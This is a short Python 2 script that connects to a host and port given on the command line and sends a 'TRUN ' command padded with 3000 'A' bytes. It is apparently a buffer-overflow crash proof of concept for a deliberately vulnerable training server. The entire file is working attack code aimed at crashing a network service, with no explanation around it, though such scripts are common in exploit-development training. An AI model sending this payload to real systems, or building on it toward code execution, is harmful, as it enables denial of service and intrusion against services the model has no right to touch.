#!/usr/bin/python

import socket
import sys


if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST> <PORT>\n"
    sys.exit()


ip = sys.argv[1]
port = int(sys.argv[2])


end = " HTTP/1.1\r\n\r\n"


buffer = "TRUN " + "\x41"*3000 + end 


try:
    print "\nSending payload..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect((ip,port))
    s.send(buffer)
    s.close()
    print "\nDone..."
except:
    print "\nCould not connect to server."

